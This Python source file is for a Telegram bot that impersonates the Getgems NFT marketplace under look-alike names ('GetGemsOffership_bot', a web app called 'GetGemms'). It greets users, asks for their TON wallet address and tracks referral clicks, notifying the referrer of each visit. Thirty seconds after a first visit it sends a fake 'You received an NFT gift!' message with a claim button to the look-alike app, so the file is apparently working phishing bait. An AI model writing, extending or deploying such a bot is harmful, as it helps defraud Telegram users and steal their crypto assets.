import asyncio
import re
from telethon import events, Button
from telethon.tl.types import User, MessageEntityBold, MessageEntityTextUrl

from server.bot.store.referral_links import add_referral_click, get_referral_by_link
from server.utils.referral_logging import log_referral_action


async def handle_start_command(event: events.NewMessage.Event):
    """
    Handles /start command with welcome message and URL buttons.
    Also handles referral links (/start ref_123456) and tracks clicks.
    """
    sender = await event.get_sender()
    user_name = "друг"
    
    if isinstance(sender, User):
        if sender.first_name:
            user_name = sender.first_name
        elif sender.username:
            user_name = f"@{sender.username}"
        elif sender.last_name:
            user_name = sender.last_name

    # Check if this is a referral link
    message_text = event.message.text or ""
    # Check for both "/start ref_" and "/start " (parameter comes after space)
    message_parts = message_text.split()
    is_referral = len(message_parts) >= 2 and message_parts[0] == "/start" and message_parts[1].startswith("ref_")
    referral_link_str = None
    
    print(f"[BOT] [START] User {sender.id} sent: '{message_text}', parts: {message_parts}, is_referral: {is_referral}")
    
    if is_referral:
        # Extract referral link from /start ref_123456
        # Format: https://t.me/bot_username?start=ref_123456
        bot_me = await event.client.get_me()
        bot_username = bot_me.username or "GetGemsOffership_bot"
        ref_param = message_parts[1]  # This is "ref_123456"
        ref_user_id = ref_param.replace("ref_", "").strip()
        referral_link_str = f"https://t.me/{bot_username}?start=ref_{ref_user_id}"
        
        print(f"[BOT] [REFERRAL] Referral link detected: {referral_link_str}")
        print(f"[BOT] [REFERRAL] User: id={sender.id}, username={sender.username}, first_name={sender.first_name}")
        
        # Record the click
        add_referral_click(
            referral_link=referral_link_str,
            user_id=sender.id,
            username=sender.username,
            first_name=sender.first_name
        )
        print(f"[BOT] [REFERRAL] Click recorded")
        
        # Log bot visit action (this will also send notification to referrer)
        log_referral_action(
            user_id=sender.id,
            action_type="bot_visit",
            details=None
        )
        print(f"[BOT] [REFERRAL] Action logged and notification sent")
    
    welcome_message = f"""👋 Привет, {user_name}!

Это бот Getgems, через него можно торговать на нашем маркетплейсе прямо в мини-аппе Telegram, и это удобнейший способ торговать Номерами, Юзернеймами и Подарками с 0% комиссией! 💯

💡 Главное, с помощью этого бота вы можете дарить и обмениваться своими NFT-подарками прямо в чатах и диалогах, для этого просто отправьте боту свой адрес TON-кошелька. После удачной привязки, когда вы начнете набирать в любой переписке @GetGemsOffership_bot — активируется inline-режим, теперь можно дарить и обмениваться NFT прямо в переписке!"""

    # Create inline keyboard with URL buttons
    buttons = [
        [
            Button.url(
                "Торговать Telegram Numbers",
                "https://getgems.io/collection/EQAOQdwdw8kGftJCSFgOErM1mBjYPe4DBPq8-AhF6vr9si5N?utm_source=homepage&utm_medium=top_collections&utm_campaign=collection_overview"
            )
        ],
        [
            Button.url(
                "Торговать Telegram Usernames",
                "https://getgems.io/collection/EQCA14o1-VWhS2efqoh_9M1b_A9DtKTuoqfmkn83AbJzwnPi?utm_source=homepage&utm_medium=top_collections&utm_campaign=collection_overview"
            )
        ],
        [
            Button.url(
                "Торговать Telegram Gifts",
                "https://getgems.io/gifts-collection"
            )
        ],
    ]

    await event.respond(welcome_message, buttons=buttons)
    print(f"[BOT] [START] Welcome message sent to user {sender.id}")
    
    # If this is a referral link, schedule gift message after 30 seconds
    # Only send if this is the first visit (no actions logged yet)
    if is_referral and referral_link_str:
        ref_data = get_referral_by_link(referral_link_str)
        if ref_data:
            # Check if this is the first visit by checking actions count
            user_actions = []
            for click in ref_data.clicks:
                if click.user_id == sender.id:
                    user_actions = click.actions
                    break
            
            # Only schedule delayed message if this is the first action (bot_visit just added)
            if len(user_actions) <= 1:
                # Schedule delayed message
                asyncio.create_task(
                    send_gift_message_after_delay(
                        client=event.client,
                        user_id=sender.id,
                        ref_data=ref_data
                    )
                )
            else:
                print(f"[BOT] [REFERRAL] Skipping delayed gift message - user already visited before")
    
    # Stop event propagation to prevent other handlers from processing this message
    raise events.StopPropagation()


def parse_nft_url(nft_url: str, fallback_name: str = "", fallback_number: str = "") -> tuple[str, str]:
    """
    Parses NFT URL to extract gift name and number.
    Example: https://t.me/nft/BDayCandle-220328 -> ("BDayCandle", "220328")
    """
    try:
        # Format: https://t.me/nft/Name-Number
        if "/nft/" in nft_url:
            parts = nft_url.split("/nft/")
            if len(parts) > 1:
                name_number = parts[-1].split("?")[0]  # Remove query params if any
                if "-" in name_number:
                    name, number = name_number.rsplit("-", 1)
                    return (name, number)
        # Fallback: use provided fallback values
        if fallback_name and fallback_number:
            return (fallback_name, fallback_number)
        return ("Gift", "Unknown")
    except Exception:
        # Fallback to provided values
        if fallback_name and fallback_number:
            return (fallback_name, fallback_number)
        return ("Gift", "Unknown")


def parse_bold_and_entities(text: str, nft_url: str, gift_info: str) -> tuple[str, list]:
    """
    Parses **text** to bold entities and creates link entity for gift_info.
    Returns (cleaned_text, entities_list)
    """
    entities = []
    
    # Step 1: Find all bold matches
    bold_pattern = r'\*\*(.+?)\*\*'
    bold_matches = list(re.finditer(bold_pattern, text))
    
    # Step 2: Build cleaned text by removing ** markers (process in reverse to maintain positions)
    cleaned_text = text
    for match in reversed(bold_matches):
        bold_text = match.group(1)
        start = match.start()
        end = match.end()
        # Replace **text** with text
        cleaned_text = cleaned_text[:start] + bold_text + cleaned_text[end:]
    
    # Step 3: Create bold entities based on cleaned text
    # Calculate cumulative offset adjustments
    offset_adjustment = 0
    for match in bold_matches:
        bold_text = match.group(1)
        # Position in original text
        orig_start = match.start()
        # Position in cleaned text (after removing ** markers)
        cleaned_start = orig_start - offset_adjustment
        
        # Calculate UTF-16 offset and length in cleaned text
        prefix_utf16 = cleaned_text[:cleaned_start].encode('utf-16-le')
        bold_text_utf16 = bold_text.encode('utf-16-le')
        
        offset = len(prefix_utf16) // 2
        length = len(bold_text_utf16) // 2
        
        entities.append(
            MessageEntityBold(
                offset=offset,
                length=length
            )
        )
        
        offset_adjustment += 4  # 2 asterisks before + 2 after
    
    # Step 4: Create link entity for gift_info (only if nft_url and gift_info provided)
    if nft_url and gift_info:
        gift_info_pos = cleaned_text.find(gift_info)
        if gift_info_pos != -1:
            prefix_utf16 = cleaned_text[:gift_info_pos].encode('utf-16-le')
            gift_info_utf16 = gift_info.encode('utf-16-le')
            gift_start = len(prefix_utf16) // 2
            gift_length = len(gift_info_utf16) // 2
            
            if gift_start >= 0 and gift_length > 0:
                entities.append(
                    MessageEntityTextUrl(
                        offset=gift_start,
                        length=gift_length,
                        url=nft_url
                    )
                )
    
    return cleaned_text, entities


async def send_gift_message_after_delay(client, user_id: int, ref_data):
    """
    Sends a gift message to the user after 30 seconds delay.
    Message format matches inline query format.
    """
    try:
        # Wait 30 seconds
        await asyncio.sleep(30)
        
        # Parse NFT URL to get correct name and number
        gift_name, gift_number = parse_nft_url(
            ref_data.nft_gift_url,
            fallback_name=ref_data.gift_name,
            fallback_number=ref_data.gift_number
        )
        gift_info = f"{gift_name} #{gift_number}"
        
        # Create message text with same format as inline query
        message_text_raw = (
            "🎁 **Вы получили NFT подарок!**\n\n"
            f"📝 {gift_info}\n\n"
            "💡 **Этот подарок был отправлен через GetGems бот.**\n\n"
            "**Нажмите на кнопку ниже, чтобы получить подарок!**"
        )
        
        # Parse bold entities and create link entity (embedded in gift_info)
        message_text, entities = parse_bold_and_entities(
            message_text_raw,
            ref_data.nft_gift_url,
            gift_info
        )
        
        # Create button with web app URL
        web_app_url = "https://t.me/GetGemsOffership_bot/GetGemms"
        buttons = [
            [Button.url("✨ Получить ✨", web_app_url)]
        ]
        
        # Send message with entities and buttons
        await client.send_message(
            user_id,
            message_text,
            formatting_entities=entities if entities else None,
            buttons=buttons
        )
        
        print(f"[BOT] [INFO] Sent delayed gift message to user_id={user_id} for gift {gift_name} #{gift_number}")
        
        # Log action (this is a technical action, not sent as notification)
        from server.bot.store.referral_links import add_referral_action
        add_referral_action(
            referral_link=ref_data.referral_link,
            user_id=user_id,
            action_type="delayed_gift_message_sent",
            details=f"Gift: {gift_name} #{gift_number}"
        )
        
    except Exception as e:
        print(f"[BOT] [ERROR] Failed to send delayed gift message to user_id={user_id}: {str(e)}")
        import traceback
        print(f"[BOT] [ERROR] Traceback: {traceback.format_exc()}")

